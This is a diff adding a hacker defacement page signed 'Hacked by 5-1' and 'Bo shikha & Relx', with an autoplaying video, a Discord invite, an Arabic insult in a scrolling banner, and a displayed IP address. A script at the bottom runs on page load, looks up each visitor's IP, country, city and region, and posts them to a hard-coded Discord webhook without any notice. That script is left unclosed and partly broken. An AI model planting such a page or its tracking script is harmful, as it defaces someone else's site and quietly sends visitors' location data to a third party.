@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="%D2%B3%CC%B8%D2%B2%CC%B8%D2%B3%20BoNasri%20%D2%B3%CC%B8%D2%B2%CC%B8%D2%B3_files/bootstrap.min.css">
+  <link rel="icon" type="image/png" href="https://cdn.discordapp.com/avatars/882128331850514512/5d381d605097b2a9c72941a371762257.webp?size=1024&amp;format=webp&amp;width=0&amp;height=230">
+  <link rel="shortcut icon">
+  <link href="%D2%B3%CC%B8%D2%B2%CC%B8%D2%B3%20BoNasri%20%D2%B3%CC%B8%D2%B2%CC%B8%D2%B3_files/css.htm" rel="stylesheet">
+  <meta name="Author" content="5-1">
+  <meta name="copyright" content="5-1">
+  <meta name="description" content="Hacked by 5-1">
+  <meta http-equiv="cache-control" content="index,cache">
+  <meta http-equiv="pragma" content="index,cache">
+  <title>ҳ̸Ҳ̸ҳ 5-1 ҳ̸Ҳ̸ҳ</title>
+  <meta charset="UTF-8">
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      overflow: hidden;
+      font-family: 'monospace';
+    }
+    .bg-video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+    .content {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      color: white;
+    }
+    h1, p, font, marquee, #clock {
+      text-shadow: 0 0 4px rgba(0, 0, 0, 0.8);
+    }
+    a:link {
+      text-decoration: none;
+    }
+  </style>
+<script>
+  function playSound() {
+    var audio = document.querySelector("audio");
+    audio.play();
+  }
+
+  async function fetchIP() {
+    try {
+      let response = await fetch('https://api.ipify.org?format=json');
+      let data = await response.json();
+      let ip = data.ip;
+      document.getElementById('ip-address').innerHTML = 'IP: ' + ip;
+    } catch (error) {
+      console.error('Error fetching IP address:', error);
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', fetchIP);
+</script></head>
+
+<body onclick="playSound()" onmouseover="playSound()">
+  <video class="bg-video" autoplay="autoplay" loop="" muted="muted">
+    <source src="https://cdn.discordapp.com/attachments/1276895317002031188/1293273427947552808/savetik1.mov?ex=6706c63d&is=670574bd&hm=b0981b2fc5c32aac589d3ff1023d9b93f3aa9996792f270ae1e3121d09df4443&" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+  <audio src="https://cdn.discordapp.com/attachments/1276895317002031188/1293273427947552808/savetik1.mov?ex=6706c63d&is=670574bd&hm=b0981b2fc5c32aac589d3ff1023d9b93f3aa9996792f270ae1e3121d09df4443&" autoplay="autoplay" loop=""></audio>
+  <div class="content">
+    <center>
+      <h1 class="ip-display"><font color="#f30404" size="6">  Hacked By (Bo shikha & Relx) </font></h1>
+      <p class="ip-display"><b><font color="#c9cdd2" size="1px"></font></b></p>
+<a href="https://discord.gg/205" style="font-size: 30px; color: rgb(221, 4, 4); text-decoration: none;">Discord.gg/5-1</a>
+     
+   
+         
+     
+    
+      <br>
+      <div class="ip-display" id="clock"></div>
+      <div id="ip-address" style="color:#ff0000; margin-top: 5px;">IP: 31.215.233.156</div>
+      <script type="text/javascript">
+        function showTime() {
+          var a_p = "";
+          var today = new Date();
+          var curr_hour = today.getHours();
+          var curr_minute = today.getMinutes();
+          var curr_second = today.getSeconds();
+          if (curr_hour < 12) {
+            a_p = "AM";
+          } else {
+            a_p = "PM";
+          }
+          if (curr_hour == 0) {
+            curr_hour = 12;
+          } if (curr_hour > 12) {
+            curr_hour = curr_hour - 12;
+          }
+          curr_hour = checkTime(curr_hour);
+          curr_minute = checkTime(curr_minute);
+          curr_second = checkTime(curr_second);
+          document.getElementById('clock').innerHTML = curr_hour + ":" + curr_minute + ":" + curr_second + " " + a_p;
+        }
+        
+        
+        
+       </script>
+<marquee>
+              <font size="2">
+                <b>بنعــاللل عمك بوشيخه </b>  
+            </font></marquee>
+          </center></div>
+      
+    
+  
+<script>
+   fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+      const { ip, country, city, region } = data;
+      const dateTime = new Date().toLocaleString();
+      const webhookUrl = 'https://canary.discord.com/api/webhooks/1272243171002155171/1VplgHFEFQeh83OCY5rmFk7cKHzmj6LjPfBsCUXcPLPSr9jQFGrO3YeTgisQeDtMM1E8';
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
+      });
+</body></html>
